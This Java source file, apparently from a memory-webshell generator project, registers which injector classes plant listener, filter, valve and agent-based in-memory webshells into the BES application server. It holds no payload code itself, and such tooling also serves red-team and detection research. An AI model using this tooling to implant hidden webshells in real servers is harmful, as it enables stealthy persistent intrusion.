package com.reajason.javaweb.memshell.server.bes;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;


import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class Bes extends AbstractServer {

    @Override
    public Class<?> getListenerInterceptor() {
        return Tomcat.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.bes.BesListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.bes.BesListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.bes.BesFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.bes.BesFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.bes.BesValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.bes.BesValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.bes.BesFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.bes.BesContextValveAgentInjector")
                .build();
    }
}
